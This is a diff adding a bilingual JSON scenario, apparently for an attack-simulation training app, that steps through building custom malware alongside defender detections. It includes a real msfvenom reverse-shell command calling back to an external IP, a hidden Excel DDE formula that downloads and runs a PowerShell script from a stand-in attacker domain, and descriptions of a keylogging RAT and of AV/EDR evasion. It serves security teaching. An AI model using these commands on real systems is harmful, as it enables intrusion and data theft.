@@ -1,0 +1,240 @@
+{
+  "id": "T1587.001",
+  "title": "커스텀 악성코드 제작 시뮬레이션",
+  "titleEn": "Custom Malware Development Simulation",
+  "duration": 12,
+  "phases": [
+    { "label": "🔧 페이로드 생성", "labelEn": "🔧 Payload Gen", "steps": [0, 1] },
+    { "label": "⚡ 로더/RAT 제작", "labelEn": "⚡ Loader/RAT Build", "steps": [2, 3] },
+    { "label": "🛡️ 탐지 우회", "labelEn": "🛡️ Evasion Test", "steps": [4, 5] },
+    { "label": "✅ C2 인프라 가동", "labelEn": "✅ C2 Launch", "steps": [6] }
+  ],
+  "topoNodes": [
+    { "id": "dev", "label": "Dev Environment", "x": 50, "y": 60 },
+    { "id": "payload", "label": "Payload", "x": 200, "y": 30 },
+    { "id": "dropper", "label": "Dropper", "x": 200, "y": 90 },
+    { "id": "c2", "label": "C2 Server", "x": 350, "y": 60 },
+    { "id": "victim", "label": "Victim PC", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "dev", "to": "payload", "minStep": 0 },
+    { "from": "dev", "to": "dropper", "minStep": 5 },
+    { "from": "payload", "to": "c2", "minStep": 6 },
+    { "from": "dropper", "to": "victim", "minStep": 5 },
+    { "from": "victim", "to": "c2", "minStep": 6 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "Malware Lab", "icon": "📁" },
+    { "name": "Q3_Financial_Report.xlsx", "icon": "📊", "alert": true },
+    { "name": "C2 Panel", "icon": "🖥️" }
+  ],
+  "steps": [
+    {
+      "cmd": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=185.220.101.34 LPORT=443 -f raw -o payload.bin",
+      "out": "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nSaved as: payload.bin\n\n[*] Payload generated with reverse HTTPS callback\n[*] C2 Server: 185.220.101.34:443\n[*] Architecture: x64\n[*] Platform: Windows",
+      "def": "[Threat Intel] Known Metasploit payload signature detected in development environment",
+      "defAction": "Source: Malware research monitoring\nTarget: Development infrastructure 185.220.101.34\nAction: IP added to threat intelligence blocklist",
+      "desc": "Metasploit으로 리버스 HTTPS 페이로드를 생성합니다. HTTPS를 사용하여 네트워크 탐지를 우회합니다.",
+      "descEn": "The attacker generates a reverse HTTPS payload with Metasploit, using HTTPS to evade network detection.",
+      "stepTitle": "Meterpreter 리버스 쉘 페이로드 생성",
+      "stepTitleEn": "Meterpreter Reverse Shell Payload Generation",
+      "feynman": "msfvenom은 악성 코드의 '레시피'를 만드는 도구입니다. 이 레시피는 피해자 컴퓨터에서 실행되면 공격자에게 '역으로 전화를 거는' 프로그램입니다. HTTPS를 사용하면 일반 웹 트래픽처럼 보여서 보안 장비가 탐지하기 어렵습니다. 510바이트로 아주 작습니다.",
+      "feynmanEn": "msfvenom creates a malware 'recipe.' When executed on the victim's computer, it 'calls back' to the attacker. Using HTTPS makes it look like normal web traffic, making it hard for security devices to detect. At 510 bytes, it's incredibly small.",
+      "expert": "msfvenom은 Metasploit의 페이로드 생성기로, reverse_https staged 페이로드를 raw 형식으로 출력합니다. HTTPS(포트 443)를 사용하여 SSL/TLS 인스펙션이 없는 환경에서 네트워크 탐지를 우회합니다.",
+      "expertEn": "msfvenom is Metasploit's payload generator, outputting a reverse_https staged payload in raw format. Using HTTPS (port 443) evades network detection in environments without SSL/TLS inspection.",
+      "defTooltip": "🦠 위협 인텔: 알려진 Metasploit 페이로드 시그니처가 감지되었습니다",
+      "defTooltipEn": "🦠 Threat Intel: Known Metasploit payload signature detected",
+      "hackerLog": {
+        "title": "msfvenom_output.log",
+        "lines": [
+          { "log": "Payload size: 510 bytes", "desc": "💡 510바이트의 매우 작은 페이로드 - 탐지하기 어렵고 메모리에 쉽게 숨길 수 있습니다" },
+          { "log": "[*] C2 Server: 185.220.101.34:443", "desc": "💡 HTTPS 포트(443)를 사용하여 일반 웹 트래픽으로 위장합니다" },
+          { "log": "reverse HTTPS callback", "desc": "💡 피해자가 공격자에게 '역방향'으로 연결 - 방화벽의 인바운드 차단을 우회합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "msfvenom", "desc": "Metasploit의 페이로드 생성 도구. 다양한 형식과 플랫폼에 맞는 악성 코드를 자동으로 생성합니다" },
+        { "name": "Reverse Shell (리버스 쉘)", "desc": "피해자 컴퓨터가 공격자에게 역으로 연결하는 방식. 방화벽이 외부→내부를 차단해도, 내부→외부 연결은 허용하는 점을 악용합니다" }
+      ]
+    },
+    {
+      "cmd": "python3 crypter.py --input payload.bin --method aes256 --key-derivation pbkdf2 --output encrypted_payload.bin",
+      "out": "[+] Custom Crypter v2.1\n[+] Input: payload.bin (510 bytes)\n[+] Encryption: AES-256-CBC\n[+] Key derivation: PBKDF2 (100,000 iterations)\n[+] IV: Random per execution\n[+] Anti-debug: NtQueryInformationProcess check\n[+] Anti-sandbox: Sleep(120s) + mouse movement check\n[+] Output: encrypted_payload.bin (1,024 bytes)\n\n[+] VirusTotal estimate: 0/72 detections\n[+] Encryption key embedded in stub loader",
+      "def": "[Sandbox] Custom crypter with anti-analysis techniques detected during testing",
+      "defAction": "Source: Malware analysis sandbox\nTarget: encrypted_payload.bin\nAction: Sample captured for signature development",
+      "desc": "AES-256 암호화와 안티디버깅/안티샌드박스 기법으로 페이로드를 래핑하여 탐지를 우회합니다.",
+      "descEn": "The attacker wraps the payload with AES-256 encryption and anti-debugging/anti-sandbox techniques to evade detection.",
+      "stepTitle": "커스텀 암호화기(Crypter) 적용",
+      "stepTitleEn": "Custom Crypter Application",
+      "feynman": "크립터는 악성 코드의 '변장 도구'입니다. AES-256 암호화로 원래 코드를 알아볼 수 없게 만들고, 보안 분석 환경(샌드박스)에서는 120초 동안 잠들어 있다가 마우스가 움직이는지 확인합니다. 실제 사용자의 컴퓨터에서만 작동하도록 만드는 것입니다. 결과는 72개 백신 중 0개가 탐지 - 완벽한 위장입니다.",
+      "feynmanEn": "A crypter is a malware 'disguise tool.' AES-256 encryption makes the original code unrecognizable, and in analysis environments (sandboxes), it sleeps for 120 seconds and checks for mouse movement. It only activates on real user computers. Result: 0 out of 72 antivirus products detect it - perfect disguise.",
+      "expert": "AES-256-CBC 암호화와 PBKDF2 키 도출(10만 반복)로 정적 분석을 무력화합니다. Anti-debug(NtQueryInformationProcess)와 Anti-sandbox(타이머 기반 + 마우스 이벤트 체크)로 동적 분석도 우회합니다. 엔트로피는 기준값 이하로 유지됩니다.",
+      "expertEn": "AES-256-CBC encryption with PBKDF2 key derivation (100K iterations) defeats static analysis. Anti-debug (NtQueryInformationProcess) and anti-sandbox (timer-based + mouse event check) evade dynamic analysis. Entropy is maintained below suspicious thresholds.",
+      "defTooltip": "🔒 샌드박스: 분석 회피 기법이 포함된 커스텀 크립터가 감지되었습니다",
+      "defTooltipEn": "🔒 Sandbox: Custom crypter with anti-analysis techniques detected",
+      "hackerLog": {
+        "title": "crypter_output.log",
+        "lines": [
+          { "log": "[+] VirusTotal estimate: 0/72 detections", "desc": "💡 72개 백신 제품 중 0개 탐지 - 사실상 '투명 망토'를 쓴 것과 같습니다" },
+          { "log": "[+] Anti-sandbox: Sleep(120s) + mouse movement check", "desc": "💡 분석 환경에서는 잠들어 있다가 실제 PC에서만 활성화됩니다" },
+          { "log": "[+] Anti-debug: NtQueryInformationProcess check", "desc": "💡 디버거로 분석하려 하면 스스로를 감추거나 종료합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Crypter (크립터)", "desc": "악성 코드를 암호화하여 백신 탐지를 우회하는 도구. 'FUD(Fully Undetectable)' 크립터는 모든 백신을 우회합니다" },
+        { "name": "Anti-Sandbox", "desc": "보안 분석 환경(샌드박스)을 감지하여 악성 행위를 숨기는 기법. 마우스 움직임, 화면 해상도, 실행 시간 등을 체크합니다" }
+      ]
+    },
+    {
+      "cmd": "gcc -o loader.exe loader.c -lws2_32 -lcrypt32 -mwindows -O2 -s -DNDEBUG",
+      "out": "[+] Compiling custom loader...\n[+] Source: loader.c (Process Hollowing technique)\n[+] Target process: svchost.exe\n[+] Injection method: NtUnmapViewOfSection + NtWriteVirtualMemory\n[+] Compile flags: Optimized, stripped symbols\n[+] Anti-analysis: String encryption, API hashing\n\n[+] Compilation successful: loader.exe (48KB)\n[+] Import table: minimal (kernel32.dll, ntdll.dll only)\n[+] Entropy: 6.2 (below suspicious threshold of 7.0)",
+      "def": "[Static Analysis] Compiled binary with process hollowing capabilities and API hashing detected",
+      "defAction": "Source: Automated malware analysis\nTarget: loader.exe\nAction: Binary submitted to threat research team for in-depth analysis",
+      "desc": "프로세스 할로잉 기법을 사용하는 커스텀 로더를 C로 컴파일합니다.",
+      "descEn": "The attacker compiles a custom loader in C that uses process hollowing to inject the payload into a legitimate process.",
+      "stepTitle": "프로세스 할로잉 로더 컴파일",
+      "stepTitleEn": "Process Hollowing Loader Compilation",
+      "feynman": "프로세스 할로잉은 합법적인 프로그램(svchost.exe)을 '빈 껍데기'로 만든 다음, 그 안에 악성 코드를 넣는 기법입니다. 마치 택배 상자에서 원래 물건을 빼고 다른 것을 넣는 것처럼, 겉으로는 정상 프로그램으로 보이지만 실제로는 악성 코드가 실행됩니다. 48KB로 매우 작고 심볼도 제거되어 분석이 어렵습니다.",
+      "feynmanEn": "Process hollowing empties a legitimate program (svchost.exe) into a 'shell' and puts malicious code inside. Like replacing the contents of a delivery package while keeping the label, it looks like a normal program but actually runs malicious code. At 48KB with stripped symbols, it's very hard to analyze.",
+      "expert": "Process Hollowing은 정상 프로세스를 생성 후 NtUnmapViewOfSection으로 메모리를 해제하고 NtWriteVirtualMemory로 악성 코드를 주입합니다. API 해싱으로 Import Table을 최소화하고, 엔트로피 6.2는 패킹 탐지 임계값(7.0) 이하를 유지합니다.",
+      "expertEn": "Process Hollowing creates a legitimate process, unmaps its memory via NtUnmapViewOfSection, and writes malicious code via NtWriteVirtualMemory. API hashing minimizes the Import Table, and entropy 6.2 stays below packing detection thresholds (7.0).",
+      "defTooltip": "🔬 정적 분석: 프로세스 할로잉과 API 해싱이 포함된 바이너리가 감지되었습니다",
+      "defTooltipEn": "🔬 Static Analysis: Binary with process hollowing and API hashing detected",
+      "hackerLog": {
+        "title": "gcc_compile.log",
+        "lines": [
+          { "log": "[+] Target process: svchost.exe", "desc": "💡 svchost.exe는 Windows에서 항상 실행되는 프로세스라 의심받지 않습니다" },
+          { "log": "[+] Import table: minimal (kernel32.dll, ntdll.dll only)", "desc": "💡 최소한의 라이브러리만 사용하여 정적 분석으로 기능을 파악하기 어렵습니다" },
+          { "log": "[+] Entropy: 6.2 (below suspicious threshold of 7.0)", "desc": "💡 엔트로피를 낮게 유지하여 '패킹된 파일'이라는 의심을 피합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Process Hollowing", "desc": "정상 프로세스의 메모리 내용을 비우고 악성 코드로 교체하는 기법. 작업 관리자에서는 정상 프로세스로 보입니다" },
+        { "name": "API Hashing", "desc": "Windows API 함수 이름을 해시 값으로 대체하여 정적 분석에서 어떤 기능을 사용하는지 숨기는 기법입니다" }
+      ]
+    },
+    {
+      "cmd": "python3 rat_builder.py --modules keylogger,screenshot,file_exfil,persistence --c2 wss://cdn-static.{companyName}-corp.com/ws",
+      "out": "[+] Building Custom RAT...\n[+] Modules:\n    ├── Keylogger (GetAsyncKeyState hook)\n    ├── Screenshot (GDI+ capture, JPEG compression)\n    ├── File Exfiltration (AES encrypted, chunked upload)\n    └── Persistence (Registry + Scheduled Task)\n\n[+] C2 Communication:\n    Protocol: WebSocket over TLS\n    Server: wss://cdn-static.{companyName}-corp.com/ws\n    Beacon interval: 30-120s (jittered)\n    Data encoding: Base64 + AES-256\n\n[+] RAT binary: gotroot_rat.dll (156KB)\n[+] DLL sideloading target: legitimate_app.exe",
+      "def": "[Network Monitor] WebSocket C2 beacon pattern detected to suspicious CDN endpoint",
+      "defAction": "Source: Network behavioral analysis\nTarget: wss://cdn-static.{companyName}-corp.com/ws\nAction: Domain blocked at proxy, SSL inspection enabled for WebSocket traffic",
+      "desc": "키로거, 스크린샷, 파일 유출 등 모듈을 포함한 커스텀 RAT를 제작합니다.",
+      "descEn": "The attacker builds a custom RAT with keylogger, screenshot, file exfiltration, and persistence modules.",
+      "stepTitle": "모듈식 커스텀 RAT 제작",
+      "stepTitleEn": "Modular Custom RAT Development",
+      "feynman": "RAT(원격 접근 트로이목마)는 공격자가 피해자 컴퓨터를 원격으로 조종하는 도구입니다. 키보드 입력 기록(키로거), 화면 캡처, 파일 훔치기, 재부팅 후에도 살아남기(지속성) 기능을 모두 갖추고 있습니다. CDN처럼 보이는 주소로 통신하여 보안 장비를 속입니다.",
+      "feynmanEn": "A RAT (Remote Access Trojan) lets the attacker remotely control the victim's computer. It includes keystroke recording (keylogger), screen capture, file theft, and reboot survival (persistence). It communicates through an address that looks like a CDN to fool security devices.",
+      "expert": "모듈식 RAT 아키텍처로, GetAsyncKeyState 키로거, GDI+ 스크린캡처, AES 암호화 청크 전송 등을 포함합니다. WebSocket over TLS(wss://)는 HTTP/2와 유사한 트래픽 패턴으로 프록시 탐지를 우회하며, 30-120초 지터 비콘으로 주기적 탐지를 회피합니다.",
+      "expertEn": "Modular RAT architecture including GetAsyncKeyState keylogger, GDI+ screen capture, and AES-encrypted chunked transfer. WebSocket over TLS (wss://) mimics HTTP/2 traffic patterns to evade proxy detection, with 30-120s jittered beacons to avoid periodic detection.",
+      "defTooltip": "📡 네트워크 모니터: 의심스러운 CDN 엔드포인트로의 WebSocket C2 비콘 감지",
+      "defTooltipEn": "📡 Network Monitor: WebSocket C2 beacon pattern to suspicious CDN endpoint detected",
+      "hackerLog": {
+        "title": "rat_builder.log",
+        "lines": [
+          { "log": "├── Keylogger (GetAsyncKeyState hook)", "desc": "💡 키보드 입력을 실시간으로 기록 - 비밀번호와 메시지가 모두 노출됩니다" },
+          { "log": "Beacon interval: 30-120s (jittered)", "desc": "💡 일정하지 않은 간격으로 통신하여 규칙적인 패턴 탐지를 우회합니다" },
+          { "log": "DLL sideloading target: legitimate_app.exe", "desc": "💡 정상 프로그램이 악성 DLL을 대신 로드하게 하여 탐지를 피합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "RAT (Remote Access Trojan)", "desc": "원격 접근 트로이목마. 감염된 컴퓨터를 공격자가 원격으로 완전히 제어할 수 있게 하는 악성 프로그램입니다" },
+        { "name": "C2 (Command & Control)", "desc": "명령 및 제어 서버. 공격자가 감염된 컴퓨터에 명령을 내리고 데이터를 수신하는 통신 인프라입니다" }
+      ]
+    },
+    {
+      "cmd": "python3 evasion_test.py --sample gotroot_rat.dll --engines defender,kaspersky,crowdstrike,sentinelone",
+      "out": "[+] Testing AV/EDR evasion...\n\nWindows Defender:   BYPASSED ✓ (AMSI patching + memory encryption)\nKaspersky:          BYPASSED ✓ (API unhooking + direct syscalls)\nCrowdStrike Falcon: DETECTED ✗ (behavioral detection on injection)\nSentinelOne:        BYPASSED ✓ (sleep obfuscation)\n\n[+] Adjusting for CrowdStrike...\n[+] Applying indirect syscalls + thread stack spoofing\n[+] Re-test CrowdStrike: BYPASSED ✓\n\n[+] Final evasion rate: 4/4 (100%)\n[+] Updated binary: gotroot_rat_v2.dll",
+      "def": "[EDR Vendor] New evasion technique detected during coordinated testing against multiple EDR products",
+      "defAction": "Source: EDR telemetry correlation\nTarget: gotroot_rat.dll variants\nAction: New behavioral signatures pushed to all endpoints",
+      "desc": "주요 AV/EDR 제품을 대상으로 탐지 우회 테스트를 수행하고 실패 시 기법을 수정합니다.",
+      "descEn": "The attacker tests evasion against major AV/EDR products and adjusts techniques for any that detect the malware.",
+      "stepTitle": "AV/EDR 탐지 우회 테스트",
+      "stepTitleEn": "AV/EDR Evasion Testing",
+      "feynman": "만든 악성 코드가 백신에 걸리는지 하나하나 테스트합니다. Windows Defender, Kaspersky, CrowdStrike 등 4개 제품을 테스트했는데, CrowdStrike가 탐지합니다. 그러면 새로운 우회 기법(간접 시스템 콜, 스레드 스택 스푸핑)을 적용하고 다시 테스트합니다. 최종 결과: 4개 모두 우회 성공!",
+      "feynmanEn": "The attacker tests each antivirus product one by one. After testing 4 products, CrowdStrike detects it. So they apply new evasion techniques (indirect syscalls, thread stack spoofing) and retest. Final result: all 4 bypassed!",
+      "expert": "AMSI 패칭, API 언후킹, 직접/간접 시스콜, 수면 난독화, 스레드 스택 스푸핑 등의 기법을 조합합니다. CrowdStrike의 행위 탐지(인젝션 패턴)를 간접 시스콜과 스택 스푸핑으로 우회하여 100% 회피율을 달성합니다.",
+      "expertEn": "Combines AMSI patching, API unhooking, direct/indirect syscalls, sleep obfuscation, and thread stack spoofing. CrowdStrike's behavioral detection (injection patterns) is evaded via indirect syscalls and stack spoofing, achieving 100% evasion rate.",
+      "defTooltip": "🛡️ EDR 벤더: 다중 EDR 제품에 대한 조직적 우회 테스트가 감지되었습니다",
+      "defTooltipEn": "🛡️ EDR Vendor: Coordinated evasion testing against multiple EDR products detected",
+      "hackerLog": {
+        "title": "evasion_test.log",
+        "lines": [
+          { "log": "CrowdStrike Falcon: DETECTED ✗ (behavioral detection on injection)", "desc": "💡 행위 기반 탐지가 인젝션을 잡아냈지만, 공격자는 이를 우회합니다" },
+          { "log": "[+] Applying indirect syscalls + thread stack spoofing", "desc": "💡 탐지된 기법을 더 정교한 방법으로 교체합니다" },
+          { "log": "[+] Final evasion rate: 4/4 (100%)", "desc": "💡 4개 보안 제품 모두 우회 - 어떤 환경에서도 탐지되지 않습니다" }
+        ]
+      },
+      "terms": [
+        { "name": "EDR (Endpoint Detection & Response)", "desc": "엔드포인트 탐지 및 대응. 단순 백신을 넘어 행위 기반 탐지, 실시간 모니터링, 사고 대응 기능을 제공하는 보안 솔루션입니다" },
+        { "name": "Indirect Syscalls", "desc": "Windows API를 거치지 않고 커널에 직접 시스템 콜을 하는 기법. EDR의 API 후킹 모니터링을 우회합니다" }
+      ]
+    },
+    {
+      "cmd": "python3 dropper_builder.py --payload gotroot_rat_v2.dll --carrier \"Q3_Financial_Report.xlsx\" --method dde",
+      "out": "[+] Building dropper...\n[+] Carrier file: Q3_Financial_Report.xlsx (legitimate Excel template)\n[+] Injection method: DDE (Dynamic Data Exchange)\n[+] Payload delivery: Stage 1 → PowerShell download → Stage 2 DLL\n[+] Auto-open: DDE field in cell A1 (hidden)\n[+] Decoy content: Real financial data template\n\n[+] DDE Formula:\n    =cmd|\"/c powershell -ep bypass -w hidden -c \\\"IEX(IWR 'https://cdn-static.{companyName}-corp.com/update.ps1')\\\"\"\n\n[+] Final dropper: Q3_Financial_Report.xlsx (234KB)\n[+] File appears legitimate to casual inspection",
+      "def": "[Email Gateway] DDE-enabled Excel file detected with hidden PowerShell download command",
+      "defAction": "Source: Email attachment analysis\nTarget: Q3_Financial_Report.xlsx\nAction: File blocked at email gateway, DDE execution disabled via GPO",
+      "desc": "합법적인 엑셀 문서에 DDE를 사용하여 악성코드 드롭퍼를 삽입합니다.",
+      "descEn": "The attacker embeds the malware dropper into a legitimate Excel document using DDE (Dynamic Data Exchange).",
+      "stepTitle": "엑셀 DDE 드롭퍼 제작",
+      "stepTitleEn": "Excel DDE Dropper Creation",
+      "feynman": "이 단계는 악성 코드를 '택배 상자(엑셀 파일)'에 넣는 것입니다. 실제 재무 보고서처럼 보이는 엑셀 파일에 DDE라는 기능을 이용해 숨겨진 명령을 삽입합니다. 파일을 열면 자동으로 PowerShell이 실행되어 악성 코드를 다운로드합니다. 받는 사람은 정상적인 재무 보고서로만 보입니다.",
+      "feynmanEn": "This step puts malicious code into a 'delivery box (Excel file).' A hidden command is inserted into a financial report that looks legitimate using DDE. Opening the file automatically runs PowerShell to download the malware. The recipient sees only a normal financial report.",
+      "expert": "DDE(Dynamic Data Exchange)는 Excel의 레거시 기능으로, 셀에 외부 명령 실행을 삽입할 수 있습니다. =cmd|\"...\" 형식의 DDE 필드가 A1 셀에 숨겨져 있으며, 문서 열림 시 PowerShell 다운로드 크래들을 실행합니다. VBA 매크로와 달리 .xlsx 확장자 사용이 가능합니다.",
+      "expertEn": "DDE (Dynamic Data Exchange) is a legacy Excel feature enabling external command execution in cells. A =cmd|\"...\" DDE field is hidden in cell A1, executing a PowerShell download cradle when the document opens. Unlike VBA macros, it can use the .xlsx extension.",
+      "defTooltip": "📊 이메일 게이트웨이: 숨겨진 PowerShell 명령이 포함된 DDE 엑셀 파일 감지",
+      "defTooltipEn": "📊 Email Gateway: DDE-enabled Excel file with hidden PowerShell command detected",
+      "hackerLog": {
+        "title": "dropper_builder.log",
+        "lines": [
+          { "log": "[+] Injection method: DDE (Dynamic Data Exchange)", "desc": "💡 매크로 대신 DDE를 사용 - .xlsx 확장자로 매크로 차단 정책을 우회합니다" },
+          { "log": "=cmd|\"/c powershell -ep bypass -w hidden...", "desc": "💡 숨겨진 DDE 명령이 PowerShell을 실행하여 악성 코드를 다운로드합니다" },
+          { "log": "[+] File appears legitimate to casual inspection", "desc": "💡 실제 재무 데이터가 포함되어 있어 의심하기 어렵습니다" }
+        ]
+      },
+      "terms": [
+        { "name": "DDE (Dynamic Data Exchange)", "desc": "Windows의 프로세스 간 통신 프로토콜. Excel에서 외부 명령 실행이 가능하여 악성 문서 제작에 악용됩니다" },
+        { "name": "Dropper (드롭퍼)", "desc": "악성 코드를 시스템에 '떨어뜨리는(설치하는)' 역할의 프로그램. 문서, 이미지 등에 숨겨져 전달됩니다" }
+      ]
+    },
+    {
+      "cmd": "python3 c2_server.py --start --domain cdn-static.{companyName}-corp.com --port 443 --protocol wss",
+      "out": "[+] C2 Server Starting...\n[+] Domain: cdn-static.{companyName}-corp.com\n[+] Protocol: WebSocket Secure (WSS)\n[+] Port: 443 (HTTPS standard)\n[+] SSL Certificate: Valid (Let's Encrypt)\n[+] Domain fronting: Enabled (via Cloudflare)\n\n[+] C2 Capabilities:\n    ├── Command execution\n    ├── File upload/download\n    ├── Keylogger data collection\n    ├── Screenshot retrieval\n    ├── Lateral movement commands\n    └── Self-destruct/cleanup\n\n[+] C2 Server ONLINE - Waiting for callbacks...\n[+] Dashboard: https://localhost:8443/panel",
+      "def": "[Network Security] Domain fronting C2 communication detected through Cloudflare CDN",
+      "defAction": "Source: Network traffic analysis (JA3 fingerprinting)\nTarget: cdn-static.{companyName}-corp.com via Cloudflare\nAction: JA3 hash blocklisted, Cloudflare notified of abuse, domain fronting blocked",
+      "desc": "WebSocket과 도메인 프론팅을 사용하는 C2 서버를 시작하여 공격 인프라를 가동합니다.",
+      "descEn": "The attacker starts a C2 server using WebSocket and domain fronting, completing the attack infrastructure.",
+      "stepTitle": "C2 서버 가동 및 인프라 완성",
+      "stepTitleEn": "C2 Server Launch and Infrastructure Completion",
+      "feynman": "마지막으로 '본부'를 세우는 단계입니다. C2 서버는 감염된 모든 컴퓨터를 원격 제어하는 관제탑입니다. CDN처럼 보이는 주소를 사용하고, Cloudflare를 경유하여 실제 서버 위치를 숨깁니다. 명령 실행, 파일 탈취, 키로거 데이터 수집 등 모든 공격 기능을 제어할 수 있으며, 위험할 때는 자가 파괴 기능도 있습니다.",
+      "feynmanEn": "The final step is setting up 'headquarters.' The C2 server is a control tower for all infected computers. Using a CDN-like address and routing through Cloudflare hides the real server location. It controls all attack functions - command execution, file theft, keylogger data - and even has a self-destruct feature for emergencies.",
+      "expert": "WebSocket Secure(WSS)는 지속적 양방향 통신을 제공하며, 도메인 프론팅은 Cloudflare CDN의 TLS SNI와 HTTP Host 헤더의 차이를 이용하여 실제 C2 도메인을 은닉합니다. JA3 핑거프린팅으로 TLS 클라이언트 특성을 분석하여 탐지할 수 있습니다.",
+      "expertEn": "WebSocket Secure (WSS) provides persistent bidirectional communication. Domain fronting exploits the difference between Cloudflare CDN's TLS SNI and HTTP Host header to conceal the actual C2 domain. JA3 fingerprinting can detect this by analyzing TLS client characteristics.",
+      "defTooltip": "🌐 네트워크 보안: Cloudflare CDN을 통한 도메인 프론팅 C2 통신이 감지되었습니다",
+      "defTooltipEn": "🌐 Network Security: Domain fronting C2 communication via Cloudflare CDN detected",
+      "hackerLog": {
+        "title": "c2_server.log",
+        "lines": [
+          { "log": "[+] Domain fronting: Enabled (via Cloudflare)", "desc": "💡 Cloudflare를 방패로 사용하여 실제 C2 서버 위치를 숨깁니다" },
+          { "log": "└── Self-destruct/cleanup", "desc": "💡 위험이 감지되면 모든 흔적을 자동 삭제하는 자가 파괴 기능이 있습니다" },
+          { "log": "[+] C2 Server ONLINE - Waiting for callbacks...", "desc": "💡 공격 인프라 완성 - 감염된 PC의 콜백을 기다리는 중입니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Domain Fronting", "desc": "CDN 서비스(Cloudflare 등)를 이용하여 실제 통신 대상을 숨기는 기법. CDN 뒤에 숨어있어 차단이 매우 어렵습니다" },
+        { "name": "WebSocket (WSS)", "desc": "실시간 양방향 통신 프로토콜. 일반 HTTPS처럼 보이면서도 지속적인 연결을 유지하여 C2 통신에 이상적입니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "bash", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "msfvenom (PID: 7101)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "python3 crypter.py (PID: 7178)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "gcc (PID: 7234)", "depth": 1, "alert": false, "minStep": 2 },
+    { "name": "python3 rat_builder.py (PID: 7312)", "depth": 1, "alert": true, "minStep": 3 },
+    { "name": "python3 evasion_test.py (PID: 7389)", "depth": 1, "alert": true, "minStep": 4 },
+    { "name": "python3 dropper_builder.py (PID: 7445)", "depth": 1, "alert": true, "minStep": 5 },
+    { "name": "python3 c2_server.py (PID: 7512)", "depth": 1, "alert": true, "minStep": 6 }
+  ]
+}
